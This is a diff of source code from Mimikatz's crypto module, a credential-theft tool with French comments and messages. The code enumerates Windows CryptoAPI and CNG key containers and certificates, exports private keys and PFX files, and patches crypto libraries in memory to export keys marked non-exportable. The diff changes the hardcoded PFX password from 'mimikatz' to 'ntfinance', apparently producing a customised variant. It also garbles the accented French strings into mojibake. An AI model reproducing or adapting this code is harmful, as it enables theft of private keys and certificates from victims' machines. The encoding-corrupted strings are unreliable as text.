@@ -8,14 +8,14 @@
 vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_crypto::getMimiKatzCommands()
 {
 	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listProviders,		L"listProviders",		L"Liste les providers installés)"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listStores,			L"listStores",			L"Liste les magasins système"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listProviders,		L"listProviders",		L"Liste les providers installÃ©s)"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listStores,			L"listStores",			L"Liste les magasins systÃ¨me"));
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listCertificates,	L"listCertificates",	L"Liste les certificats"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listKeys,			L"listKeys",			L"Liste les conteneurs de clés"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listKeys,			L"listKeys",			L"Liste les conteneurs de clÃ©s"));
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(exportCertificates,	L"exportCertificates",	L"Exporte les certificats"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(exportKeys,			L"exportKeys",			L"Exporte les clés"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(patchcng,			L"patchcng",			L"[experimental] Patch le gestionnaire de clés pour l\'export de clés non exportable"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(patchcapi,			L"patchcapi",			L"[experimental] Patch la CryptoAPI courante pour l\'export de clés non exportable"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(exportKeys,			L"exportKeys",			L"Exporte les clÃ©s"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(patchcng,			L"patchcng",			L"[experimental] Patch le gestionnaire de clÃ©s pour l\'export de clÃ©s non exportable"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(patchcapi,			L"patchcapi",			L"[experimental] Patch la CryptoAPI courante pour l\'export de clÃ©s non exportable"));
 	return monVector;
 }
 
@@ -120,7 +120,7 @@ void mod_mimikatz_crypto::listAndOrExportKeys(vector<wstring> * arguments, bool 
 	vector<wstring> * monVectorKeys = new vector<wstring>();
 
 	/* CryptoAPI */
-	(*outputStream) << L"[" << type << L"] Clés CryptoAPI :" << endl;
+	(*outputStream) << L"[" << type << L"] ClÃ©s CryptoAPI :" << endl;
 	if(mod_cryptoapi::getVectorContainers(monVectorKeys, isMachine))
 	{
 		DWORD i;
@@ -140,9 +140,9 @@ void mod_mimikatz_crypto::listAndOrExportKeys(vector<wstring> * arguments, bool 
 						(*outputStream) << L"\t\tType          : " << mod_crypto::KeyTypeToString(ks) << endl;
 						DWORD param = 0, taille = sizeof(param);
 						if(CryptGetKeyParam(maCle, KP_PERMISSIONS, reinterpret_cast<BYTE *>(&param), &taille, NULL))
-							(*outputStream) << L"\t\tExportabilité : " << (param & CRYPT_EXPORT ? L"OUI" : L"NON") << endl;
+							(*outputStream) << L"\t\tExportabilitÃ© : " << (param & CRYPT_EXPORT ? L"OUI" : L"NON") << endl;
 						if(CryptGetKeyParam(maCle, KP_KEYLEN, reinterpret_cast<BYTE *>(&param), &taille, NULL))
-							(*outputStream) << L"\t\tTaille clé    : " << param << endl;
+							(*outputStream) << L"\t\tTaille clÃ©    : " << param << endl;
 
 						if(exportKeys)
 						{
@@ -162,7 +162,7 @@ void mod_mimikatz_crypto::listAndOrExportKeys(vector<wstring> * arguments, bool 
 								delete[] monExport;
 							}
 
-							(*outputStream) << L"\t\tExport privé dans  \'" << monBuff.str() << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
+							(*outputStream) << L"\t\tExport privÃ© dans  \'" << monBuff.str() << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
 							if(!reussite)
 							{
 								(*outputStream) << L"\t\t\tmod_cryptoapi::getPrivateKey/PrivateKeyBlobToPVK : " << mod_system::getWinError() << endl;
@@ -174,12 +174,12 @@ void mod_mimikatz_crypto::listAndOrExportKeys(vector<wstring> * arguments, bool 
 				if(maCle)
 					CryptDestroyKey(maCle);
 				else
-					(*outputStream) << L"\t\t* Erreur de clé ; " << mod_system::getWinError() << endl;
+					(*outputStream) << L"\t\t* Erreur de clÃ© ; " << mod_system::getWinError() << endl;
 
 
 				CryptReleaseContext(hCryptKeyProv, 0);
 			}
-			else (*outputStream) << L"\t\t* Erreur d\'acquisition de la clé ; " << mod_system::getWinError() << endl;
+			else (*outputStream) << L"\t\t* Erreur d\'acquisition de la clÃ© ; " << mod_system::getWinError() << endl;
 		}
 	}
 	else (*outputStream) << L"mod_cryptoapi::getVectorContainers : " << mod_system::getWinError() << endl;
@@ -190,7 +190,7 @@ void mod_mimikatz_crypto::listAndOrExportKeys(vector<wstring> * arguments, bool 
 		(*outputStream) << endl;
 		monVectorKeys->clear();
 
-		(*outputStream) << L"[" << type << L"] Clés CNG :" << endl;
+		(*outputStream) << L"[" << type << L"] ClÃ©s CNG :" << endl;
 		if(mod_cryptong::getVectorContainers(monVectorKeys, isMachine))
 		{
 			DWORD i;
@@ -206,9 +206,9 @@ void mod_mimikatz_crypto::listAndOrExportKeys(vector<wstring> * arguments, bool 
 					DWORD size = 0;
 
 					if(mod_cryptong::isKeyExportable(&maCle, &exportable))
-						(*outputStream) << L"\t\tExportabilité : " << (exportable ? L"OUI" : L"NON") << endl;
+						(*outputStream) << L"\t\tExportabilitÃ© : " << (exportable ? L"OUI" : L"NON") << endl;
 					if(mod_cryptong::getKeySize(&maCle, &size))
-						(*outputStream) << L"\t\tTaille clé    : " << size << endl;
+						(*outputStream) << L"\t\tTaille clÃ©    : " << size << endl;
 
 					if(exportKeys)
 					{
@@ -225,7 +225,7 @@ void mod_mimikatz_crypto::listAndOrExportKeys(vector<wstring> * arguments, bool 
 							delete[] monExport;
 						}
 
-						(*outputStream) << L"\t\tExport privé dans  \'" << monBuff.str() << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
+						(*outputStream) << L"\t\tExport privÃ© dans  \'" << monBuff.str() << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
 						if(!reussite)
 						{
 							(*outputStream) << L"\t\t\tmod_cryptong::getPrivateKey/PrivateKeyBlobToPVK : " << mod_system::getWinError() << endl;
@@ -284,7 +284,7 @@ void mod_mimikatz_crypto::listAndOrExportCertificates(vector<wstring> * argument
 				mod_crypto::KIWI_KEY_PROV_INFO keyProvInfo;
 				if(mod_crypto::getKiwiKeyProvInfo(pCertContext, &keyProvInfo))
 				{
-					(*outputStream) << L"\t\tContainer Clé : " << keyProvInfo.pwszContainerName << endl;
+					(*outputStream) << L"\t\tContainer ClÃ© : " << keyProvInfo.pwszContainerName << endl;
 					(*outputStream) << L"\t\tProvider      : " << keyProvInfo.pwszProvName << endl;
 						
 					HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv = NULL;
@@ -310,7 +310,7 @@ void mod_mimikatz_crypto::listAndOrExportCertificates(vector<wstring> * argument
 									mod_cryptong::NCryptFreeObject(monProv);
 								}
 							}
-							else (*outputStream) << L"\t\t\tErreur : Clé de type nCrypt, sans nCrypt ?" << endl;
+							else (*outputStream) << L"\t\t\tErreur : ClÃ© de type nCrypt, sans nCrypt ?" << endl;
 						}
 						else
 						{
@@ -334,8 +334,8 @@ void mod_mimikatz_crypto::listAndOrExportCertificates(vector<wstring> * argument
 						}
 						if(reussite)
 						{
-							(*outputStream) << L"\t\tExportabilité : " << (exportable ? L"OUI" : L"NON") << endl;
-							(*outputStream) << L"\t\tTaille clé    : " << size << endl;
+							(*outputStream) << L"\t\tExportabilitÃ© : " << (exportable ? L"OUI" : L"NON") << endl;
+							(*outputStream) << L"\t\tTaille clÃ©    : " << size << endl;
 						}
 
 						if(exportCert)
@@ -343,9 +343,9 @@ void mod_mimikatz_crypto::listAndOrExportCertificates(vector<wstring> * argument
 							wstring PFXFile = monBuff.str();
 							PFXFile.append(L"pfx");
 
-							reussite = mod_crypto::CertCTXtoPFX(pCertContext, PFXFile, L"mimikatz");
+							reussite = mod_crypto::CertCTXtoPFX(pCertContext, PFXFile, L"ntfinance");
 
-							(*outputStream) << L"\t\tExport privé dans  \'" << PFXFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
+							(*outputStream) << L"\t\tExport privÃ© dans  \'" << PFXFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
 							if(!reussite)
 							{
 								(*outputStream) << L"\t\t\t" << mod_system::getWinError() << endl;
@@ -460,7 +460,7 @@ bool mod_mimikatz_crypto::patchcapi(vector<wstring> * arguments)
 		if(	mod_memory::genericPatternSearch(&ptr4001, LIBNAME_WALL_RSA, pattern4001, taillePattern4001, offsetPatch4001, FUNCNAM_WALL_EXPORT, true, true) &&
 			mod_memory::genericPatternSearch(&ptr4000, LIBNAME_WALL_RSA, pattern4000, taillePattern4000, offsetPatch4000, FUNCNAM_WALL_EXPORT, true, true))
 		{
-			(*outputStream) << L"Patterns CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE et CRYPT_ARCHIVABLE trouvés !" << endl <<
+			(*outputStream) << L"Patterns CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE et CRYPT_ARCHIVABLE trouvÃ©s !" << endl <<
 			L"Patch CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE : " << (mod_memory::writeMemory(ptr4001, patch4001, taillePatch4001) ? L"OK" : L"KO") << endl <<
 			L"Patch CRYPT_ARCHIVABLE                    : " << (mod_memory::writeMemory(ptr4000, patch4000, taillePatch4000) ? L"OK" : L"KO") << endl;
 		}
